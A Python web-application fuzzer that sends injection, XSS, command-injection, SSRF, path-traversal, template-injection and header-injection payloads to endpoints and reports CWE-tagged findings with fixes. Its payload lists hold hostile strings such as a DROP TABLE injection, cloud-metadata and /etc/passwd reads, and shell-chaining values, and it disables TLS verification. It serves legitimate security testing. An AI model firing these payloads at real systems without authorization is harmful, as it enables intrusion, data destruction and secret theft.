#!/usr/bin/env python3
"""
Live Fuzzer — Sends actual HTTP requests with attack payloads to test
endpoints for vulnerabilities. Analyzes responses for error indicators,
reflections, and anomalies.

Usage:
    python live_fuzzer.py --url <endpoint> --params <name1=val1&name2=val2> [--method GET|POST] [--output <file>]
    python live_fuzzer.py --url <endpoint> --json '{"key":"value"}' --method POST
    python live_fuzzer.py --url <endpoint> --wordlist <file> --param <name>
    python live_fuzzer.py --scan-file <scan-results.json>  # Auto-fuzz from web_scanner results

Examples:
    python live_fuzzer.py --url http://localhost:3000/search --params "q=test" --method GET
    python live_fuzzer.py --url http://localhost:3000/login --params "user=admin&pass=test" --method POST
    python live_fuzzer.py --scan-file /tmp/web-scan.json --output /tmp/fuzz-results.json
"""

import argparse
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import ssl
from datetime import datetime, timezone
from http.cookiejar import CookieJar


USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# ─── Payload Sets ───

PAYLOAD_SETS = {
    "sqli": {
        "payloads": [
            "'", "''", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
            "1' AND '1'='2", "1' AND '1'='1", "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--", "'; DROP TABLE test--",
            "1; WAITFOR DELAY '0:0:3'--", "1' AND SLEEP(3)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
        ],
        "indicators": [
            "sql", "syntax", "mysql", "postgresql", "sqlite", "oracle", "ORA-",
            "unterminated", "quoted string", "SQLSTATE", "microsoft sql",
            "ODBC", "DB2", "near \"'\"", "unexpected end",
        ],
        "time_threshold_ms": 2500,
    },
    "xss": {
        "payloads": [
            "<script>alert('XSS')</script>",
            "\"><img src=x onerror=alert('XSS')>",
            "'-alert('XSS')-'",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "\"><svg/onload=alert('XSS')>",
            "{{7*7}}",
        ],
        "check_reflection": True,
    },
    "cmdi": {
        "payloads": [
            "; echo CMDI_MARKER_82391", "| echo CMDI_MARKER_82391",
            "`echo CMDI_MARKER_82391`", "$(echo CMDI_MARKER_82391)",
            "& echo CMDI_MARKER_82391", "|| echo CMDI_MARKER_82391",
        ],
        "marker": "CMDI_MARKER_82391",
    },
    "ssrf": {
        "payloads": [
            "http://127.0.0.1:80", "http://localhost:80",
            "http://[::1]:80", "http://0.0.0.0:80",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            "file:///etc/passwd",
        ],
        "indicators": ["root:", "meta-data", "ami-id", "instance-id", "[fonts]"],
    },
    "traversal": {
        "payloads": [
            "../../../etc/passwd", "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd", "..\\..\\..\\windows\\win.ini",
            "/etc/passwd%00.jpg", "..%252f..%252f..%252fetc/passwd",
        ],
        "indicators": ["root:", "[fonts]", "boot loader", "[extensions]"],
    },
    "ssti": {
        "payloads": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{7*'7'}}"],
        "indicator": "49",
    },
    "header_injection": {
        "payloads": [
            "test\r\nX-Injected: true", "test%0d%0aX-Injected:%20true",
            "test\r\nSet-Cookie: evil=1",
        ],
    },
}

BOUNDARY_VALUES = [
    "", " ", "null", "undefined", "NaN", "true", "false",
    "-1", "0", "99999999999", "0.1", "-0",
    "A" * 10000,
    "\x00", "\r\n", "\n", "\t",
    "[]", "{}", '{"__proto__":{"admin":true}}',
]


def create_opener():
    cookie_jar = CookieJar()
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cookie_jar),
        urllib.request.HTTPSHandler(context=ctx),
    )
    opener.addheaders = [("User-Agent", USER_AGENT)]
    return opener


def send_request(opener, url, method="GET", params=None, json_body=None, headers=None, timeout=10):
    """Send HTTP request and return detailed response."""
    result = {"url": url, "method": method, "status": 0, "body": "", "headers": {},
              "response_time_ms": 0, "error": None, "content_length": 0}

    try:
        data = None
        if json_body:
            data = json.dumps(json_body).encode("utf-8")
            if not headers:
                headers = {}
            headers["Content-Type"] = "application/json"
        elif params and method in ("POST", "PUT", "PATCH"):
            data = urllib.parse.urlencode(params).encode("utf-8")
            if not headers:
                headers = {}
            headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
        elif params and method == "GET":
            sep = "&" if "?" in url else "?"
            url = f"{url}{sep}{urllib.parse.urlencode(params)}"

        req = urllib.request.Request(url, data=data, method=method)
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)

        start = time.time()
        resp = opener.open(req, timeout=timeout)
        elapsed = (time.time() - start) * 1000

        result["status"] = resp.getcode()
        result["headers"] = dict(resp.headers)
        result["response_time_ms"] = round(elapsed, 1)
        try:
            body = resp.read(200000)
            result["body"] = body.decode("utf-8", errors="replace")
            result["content_length"] = len(body)
        except Exception:
            pass

    except urllib.error.HTTPError as e:
        result["status"] = e.code
        result["headers"] = dict(e.headers) if e.headers else {}
        result["response_time_ms"] = round((time.time() - start) * 1000, 1) if 'start' in dir() else 0
        try:
            result["body"] = e.read(100000).decode("utf-8", errors="replace")
        except Exception:
            pass
    except Exception as e:
        result["error"] = str(e)

    return result


def fuzz_parameter(opener, url, param_name, original_value, method="GET",
                   categories=None, json_mode=False):
    """Fuzz a single parameter with all payload categories."""
    findings = []
    categories = categories or list(PAYLOAD_SETS.keys())

    # Get baseline response
    if json_mode:
        baseline = send_request(opener, url, method, json_body={param_name: original_value})
    else:
        baseline = send_request(opener, url, method, params={param_name: original_value})

    baseline_status = baseline["status"]
    baseline_length = baseline["content_length"]
    baseline_time = baseline["response_time_ms"]

    for cat in categories:
        if cat not in PAYLOAD_SETS:
            continue
        pset = PAYLOAD_SETS[cat]

        for payload in pset["payloads"]:
            test_val = payload

            if json_mode:
                resp = send_request(opener, url, method, json_body={param_name: test_val})
            else:
                resp = send_request(opener, url, method, params={param_name: test_val})

            if resp["error"]:
                continue

            body_lower = resp.get("body", "").lower()
            anomaly = False
            evidence_parts = []

            # Check for SQL injection
            if cat == "sqli":
                if any(ind in body_lower for ind in pset["indicators"]):
                    anomaly = True
                    evidence_parts.append("SQL error in response")
                if resp["status"] == 500 and baseline_status != 500:
                    anomaly = True
                    evidence_parts.append(f"Status changed: {baseline_status} -> 500")
                if resp["response_time_ms"] > baseline_time + pset["time_threshold_ms"]:
                    anomaly = True
                    evidence_parts.append(f"Response time: {resp['response_time_ms']}ms (baseline: {baseline_time}ms)")

            # Check for XSS reflection
            elif cat == "xss":
                if payload in resp.get("body", ""):
                    anomaly = True
                    evidence_parts.append("Payload reflected without encoding")
                elif payload.replace("'", "&#39;").replace('"', "&quot;") not in resp.get("body", ""):
                    # Check partial reflection
                    if "alert(" in resp.get("body", "") and "XSS" in resp.get("body", ""):
                        anomaly = True
                        evidence_parts.append("Partial payload reflection detected")

            # Check for command injection
            elif cat == "cmdi":
                if pset.get("marker") and pset["marker"] in resp.get("body", ""):
                    anomaly = True
                    evidence_parts.append(f"Command execution marker found in response")

            # Check for SSRF
            elif cat == "ssrf":
                if any(ind in body_lower for ind in pset.get("indicators", [])):
                    anomaly = True
                    evidence_parts.append("Internal resource content in response")

            # Check for path traversal
            elif cat == "traversal":
                if any(ind in body_lower for ind in pset.get("indicators", [])):
                    anomaly = True
                    evidence_parts.append("File system content in response")

            # Check for SSTI
            elif cat == "ssti":
                if pset.get("indicator") and pset["indicator"] in resp.get("body", ""):
                    if "7*7" not in resp.get("body", ""):  # Make sure it was evaluated
                        anomaly = True
                        evidence_parts.append("Template expression evaluated (7*7=49)")

            # Generic anomaly detection
            if not anomaly:
                len_diff = abs(resp["content_length"] - baseline_length)
                if resp["status"] != baseline_status and resp["status"] in (500, 502, 503):
                    anomaly = True
                    evidence_parts.append(f"Server error: {resp['status']}")

            if anomaly:
                severity_map = {
                    "sqli": "critical", "xss": "high", "cmdi": "critical",
                    "ssrf": "high", "traversal": "critical", "ssti": "critical",
                    "header_injection": "medium",
                }
                cwe_map = {
                    "sqli": "CWE-89", "xss": "CWE-79", "cmdi": "CWE-78",
                    "ssrf": "CWE-918", "traversal": "CWE-22", "ssti": "CWE-1336",
                    "header_injection": "CWE-113",
                }
                findings.append({
                    "id": f"BB-FUZZ-{cat.upper()}", "name": f"{cat.upper()} detected: {param_name}",
                    "severity": severity_map.get(cat, "medium"),
                    "category": f"Injection ({cat})", "cwe": cwe_map.get(cat, ""),
                    "description": f"Parameter '{param_name}' vulnerable to {cat}",
                    "evidence": " | ".join(evidence_parts),
                    "endpoint": url, "parameter": param_name,
                    "method": method, "payload": payload,
                    "response_status": resp["status"],
                    "response_time_ms": resp["response_time_ms"],
                    "fix": get_fix_for_category(cat),
                })
                break  # One finding per category per parameter

    # Boundary value testing
    for bval in BOUNDARY_VALUES[:8]:
        if json_mode:
            resp = send_request(opener, url, method, json_body={param_name: bval})
        else:
            resp = send_request(opener, url, method, params={param_name: bval})

        if resp["status"] == 500 and baseline_status != 500:
            findings.append({
                "id": "BB-FUZZ-BOUNDARY", "name": f"Server error on boundary input: {param_name}",
                "severity": "medium", "category": "Input Validation", "cwe": "CWE-20",
                "description": f"Server crashes on boundary value for '{param_name}'",
                "evidence": f"Input: {repr(bval)[:50]} | Status: {resp['status']}",
                "endpoint": url, "parameter": param_name, "method": method,
                "payload": repr(bval)[:50],
                "fix": "Validate and sanitize all input. Handle edge cases gracefully.",
            })
            break

    return findings


def get_fix_for_category(cat):
    fixes = {
        "sqli": "Use parameterized queries. Never concatenate user input into SQL.",
        "xss": "Encode all output. Use Content-Security-Policy header.",
        "cmdi": "Use safe APIs (subprocess with array args). Never pass user input to shell.",
        "ssrf": "Validate URLs against allowlist. Block internal IP ranges.",
        "traversal": "Normalize paths and verify they stay within allowed directory.",
        "ssti": "Never place user input in template strings. Use template variables.",
        "header_injection": "Strip newlines from all header values.",
    }
    return fixes.get(cat, "Validate and sanitize all user input.")


def auto_fuzz_from_scan(scan_file):
    """Read web_scanner results and auto-fuzz all discovered forms and params."""
    with open(scan_file, "r", encoding="utf-8") as f:
        data = json.load(f)

    scan_data = data.get("scan_data", {})
    findings = []
    opener = create_opener()

    # Extract endpoints with parameters from existing findings
    endpoints = set()
    for finding in data.get("findings", []):
        ep = finding.get("endpoint", "")
        param = finding.get("parameter", "")
        method = finding.get("method", "GET")
        if ep and param:
            endpoints.add((ep, param, method))

    print(f"[*] Auto-fuzzing {len(endpoints)} endpoint/parameter combinations", file=sys.stderr)

    for ep, param, method in endpoints:
        print(f"    Fuzzing {method} {ep} [{param}]...", file=sys.stderr)
        param_findings = fuzz_parameter(opener, ep, param, "test", method)
        findings.extend(param_findings)

    return findings


def format_markdown(findings, url):
    sev_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
    for f in findings:
        s = f.get("severity", "info")
        sev_counts[s] = sev_counts.get(s, 0) + 1

    lines = [
        "# Live Fuzzing Report",
        f"**Target:** `{url}`",
        f"**Date:** {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}",
        f"**Findings:** {len(findings)}",
        f"**Critical:** {sev_counts['critical']} | **High:** {sev_counts['high']} | "
        f"**Medium:** {sev_counts['medium']} | **Low:** {sev_counts['low']}",
        "", "---", "",
    ]

    severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    for f in sorted(findings, key=lambda x: severity_order.get(x.get("severity", "info"), 4)):
        lines.extend([
            f"### [{f['severity'].upper()}] {f['name']}",
            f"- **Endpoint:** `{f.get('endpoint', 'N/A')}`",
            f"- **Parameter:** `{f.get('parameter', 'N/A')}`",
            f"- **Method:** {f.get('method', 'N/A')}",
            f"- **Payload:** `{f.get('payload', 'N/A')}`",
            f"- **Evidence:** {f.get('evidence', 'N/A')}",
            f"- **Fix:** {f.get('fix', 'N/A')}",
            "",
        ])

    return "\n".join(lines)


def main():
    parser = argparse.ArgumentParser(
        description="Live Fuzzer — send attack payloads to test endpoints",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--url", help="Target endpoint URL")
    parser.add_argument("--params", help="Parameters (name1=val1&name2=val2)")
    parser.add_argument("--json", dest="json_body", help="JSON body string")
    parser.add_argument("--method", choices=["GET", "POST", "PUT", "PATCH", "DELETE"], default="GET")
    parser.add_argument("--param", help="Single parameter name to fuzz")
    parser.add_argument("--categories", help="Comma-separated: sqli,xss,cmdi,ssrf,traversal,ssti")
    parser.add_argument("--scan-file", help="Auto-fuzz from web_scanner JSON results")
    parser.add_argument("--output", help="Output file")
    parser.add_argument("--format", choices=["json", "markdown"], default="json")

    args = parser.parse_args()

    if args.scan_file:
        findings = auto_fuzz_from_scan(args.scan_file)
        target = args.scan_file
    elif args.url:
        opener = create_opener()
        findings = []
        categories = args.categories.split(",") if args.categories else None

        if args.params:
            pairs = urllib.parse.parse_qs(args.params, keep_blank_values=True)
            for pname, pvals in pairs.items():
                print(f"[*] Fuzzing parameter: {pname}", file=sys.stderr)
                pfindings = fuzz_parameter(
                    opener, args.url, pname, pvals[0] if pvals else "",
                    args.method, categories
                )
                findings.extend(pfindings)
        elif args.param:
            print(f"[*] Fuzzing parameter: {args.param}", file=sys.stderr)
            findings = fuzz_parameter(
                opener, args.url, args.param, "",
                args.method, categories, json_mode=bool(args.json_body)
            )

        target = args.url
    else:
        parser.error("Must provide --url or --scan-file")
        return

    print(f"\n[*] Total findings: {len(findings)}", file=sys.stderr)

    if args.format == "markdown":
        output = format_markdown(findings, target)
    else:
        output = json.dumps({"findings": findings, "total": len(findings)}, indent=2, default=str)

    if args.output:
        os.makedirs(os.path.dirname(args.output) or ".", exist_ok=True)
        with open(args.output, "w", encoding="utf-8") as f:
            f.write(output)
        print(f"Results written to {args.output}", file=sys.stderr)
    else:
        sys.stdout.buffer.write(output.encode("utf-8", errors="replace"))
        sys.stdout.buffer.write(b"\n")


if __name__ == "__main__":
    main()
